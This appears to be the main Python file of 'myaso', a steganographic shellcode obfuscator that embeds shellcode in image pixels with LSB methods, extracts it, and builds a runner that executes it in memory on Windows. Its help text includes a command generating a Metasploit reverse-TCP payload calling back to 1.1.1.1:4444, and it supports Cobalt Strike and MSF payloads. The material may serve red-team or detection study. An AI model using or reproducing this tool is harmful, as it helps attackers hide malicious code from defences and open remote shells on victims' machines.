"""
C implementation reads pixels left to right, top to bottom
Python implementation reads pixels left to right, bottom to top!
"""
import argparse
import os

from PIL import Image
from bitarray import bitarray

from src import shellcode, builder
from algorithms import LSB, LSBX

ALGORITHMS = {
    'LSB': LSB,
    'LSB-X': LSBX
}


def embed_sc(args):
    sc = shellcode.from_args(args)
    print(f'Got shellcode: {sc}')
    payload = bitarray()
    payload.frombytes(sc)
    algorithm = ALGORITHMS[args.algorithm]

    img = Image.open(args.src)
    algorithm.embed(img, payload)
    img.save(args.dst)


def read_sc(args):
    img = Image.open(args.src)
    algorithm = ALGORITHMS[args.algorithm]
    payload = algorithm.extract(img, args.max_bits)
    print(payload.tobytes())


def get_runner(args):
    builder.get_runner(args.runner_config)


command_handlers = {
    'embed': embed_sc,
    'read': read_sc,
    'get-runner': get_runner
}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='myaso',
        # usage='myaso <command> [options] -- EXTRA_OPTIONS',
        description='A steganographic shellcode obfuscator. '
                    'The executor reads data from an image and executes it '
                    'using VirtualAlloc/HeapAlloc. '
    )

    # HACK: hardcoded the available commands
    parser.add_argument('command', type=str, metavar='<command>', help=f'One of {command_handlers.keys()}')

    # embed
    shellcode_source = parser.add_mutually_exclusive_group()
    shellcode_source.add_argument('-f', dest='sc_file', type=str, help='Shellcode file')
    shellcode_source.add_argument('--sc', dest='sc', type=os.fsencode,
                                  help='Shellcode encoded as Python bytes.\n'
                                       'Pass \'-\' to read shellcode from stdin.\n'
                                       'Use msf:// to generate an MSF payload automatically\n'
                                       'pass the options in the extra_options arg:\n'
                                       'python main.py --sc msf://windows/reverse_tcp -i ... -o ... -- LHOST=1.1.1.1 LPORT=4444'
                                  )

    parser.add_argument('-i', dest='src', type=str, help='Source image')
    parser.add_argument('-o', dest='dst', type=str, help='Destination image')

    # read
    parser.add_argument('--max-bits', dest='max_bits', type=int, help='Shellcode length')

    parser.add_argument('-a', dest='algorithm', type=str,
                        help=f'Algorithm to use. Available options: {", ".join(ALGORITHMS.keys())}')

    parser.add_argument('-r', '--runner-config', dest='runner_config', type=str, help='Runner config')
    parser.add_argument('extra_options', type=str, nargs='*',
                        help='Options used when generating a Cobalt or MSF payload')

    args = parser.parse_args()

    command_handlers[args.command](args)

